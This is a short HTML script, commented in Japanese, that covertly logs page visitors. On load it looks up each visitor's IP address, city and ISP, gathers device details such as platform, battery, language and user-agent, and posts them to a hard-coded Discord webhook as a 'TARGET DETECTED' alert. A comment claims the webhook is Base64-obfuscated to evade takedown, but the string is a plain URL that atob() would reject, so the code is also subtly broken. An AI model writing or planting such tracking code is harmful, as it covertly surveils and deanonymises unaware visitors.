<script type="text/javascript">
(async function(){
    try {
        // 1. Webhook URLをBase64で隠す（Discordの自動削除対策）
        const b64 = "https://discord.com/api/webhooks/1480858959148486698/rogRAjEJV4UBPNPuq6vCS1mI44C77w771WdB7RWqh696LK9IOP654SsfT1zIXjaVGF87"; 
        const w = atob(b64);

        // 2. IP情報を取得
        const res = await fetch('https://ipapi.co/json/');
        const i = await res.json();

        // 3. バッテリー情報（取得できないブラウザもあるのでエラー回避）
        let bat = "N/A";
        try { const b = await navigator.getBattery(); bat = (b.level * 100) + "%"; } catch(e){}

        // 4. 送信データ作成
        const payload = {
            embeds: [{
                title: "🚨 TARGET DETECTED",
                color: 15548997,
                fields: [
                    { name: "🌐 Network", value: `IP: ${i.ip}\nCity: ${i.city}\nOrg: ${i.org}`, inline: true },
                    { name: "📱 Device", value: `OS: ${navigator.platform}\nBattery: ${bat}\nLang: ${navigator.language}`, inline: true },
                    { name: "🔍 User-Agent", value: navigator.userAgent }
                ],
                timestamp: new Date()
            }]
        };

        // 5. Discordへ送信
        await fetch(w, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    } catch (err) {
        console.error("Error:", err);
    }
})();
</script>
